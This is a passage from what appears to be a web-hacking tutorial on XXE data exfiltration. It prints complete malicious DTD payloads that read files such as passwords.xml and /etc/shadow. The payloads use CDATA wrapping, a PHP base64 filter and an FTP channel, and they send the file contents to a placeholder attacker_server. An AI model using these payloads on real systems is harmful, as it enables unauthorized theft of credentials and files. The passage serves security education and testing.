XXE data exfiltration becomes more complicated if the parser is hardened 
against XXE attacks, and if you are trying to read files of specific formats. 
But there are always more ways to bypass restrictions!

Sometimes you’ll want to exfiltrate files that contain XML special characters, such as angle brackets (<>), quotes (" or '), and the ampersand (&). 
Accessing these files directly via an XXE would break the syntax of your DTD 
and interfere with the exfiltration. Thankfully, XML already has a feature 
that deals with this issue. In an XML file, characters wrapped within CDATA
(character data) tags are not seen as special characters. So, for instance, if 
you’re exfiltrating an XML file, you can rewrite your malicious external DTD 
as follows:

1 <!ENTITY % file SYSTEM "file:///passwords.xml">

2 <!ENTITY % start "<![CDATA[">

3 <!ENTITY % end "]]>">

4 <!ENTITY % ent "<!ENTITY &#x25; exfiltrate
'http://attacker_server/?%start;%file;%end;'>">
%ent;
%exfiltrate;


This DTD first declares a parameter entity that points to the file you 
want to read 1. It also declares two parameter entities containing the strings 
"<![CDATA[" and "]]>"2 3. Then it constructs an exfiltration URL that will 
not break the DTD’s syntax by wrapping the file’s contents in a CDATA tag 4. 
The concatenated exfiltrate entity declaration will become the following:

<!ENTITY % exfiltrate 'http://attacker_server/?<![CDATA[CONTENTS_OF_THE_FILE]]>'>

You can see that our payloads are quickly getting complicated. To prevent 
accidentally introducing syntax errors to the payload, you can use a tool such 
as XmlLint (https://xmllint.com/) to ensure that your XML syntax is valid.
Finally, send your usual XML payload to the target to execute the attack:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
 <!ENTITY % xxe SYSTEM "http://attacker_server/xxe.dtd">
 %xxe;
]>

Another way of exfiltrating files with special characters is to use a PHP 
URL wrapper. If the target is a PHP-based app, PHP wrappers let you convert the desired data into base64 format so you can use it to read XML files 
or even binary files:

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>">
%ent;
%exfiltrate;

The File Transfer Protocol (FTP) can also be used to send data directly 
while bypassing special character restrictions. HTTP has many special character restrictions and typically restricts the length of the URL. Using FTP 
instead is an easy way to bypass that. To use it, you need to run a simple 
FTP server on your machine and modify your malicious DTD accordingly. I 
used the simple Ruby server script at https://github.com/ONsec-Lab/scripts/blob/
master/xxe-ftp-server.rb:

<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM
 'ftp://attacker_server:2121/?%file;'>">
%ent;
%exfiltrate;

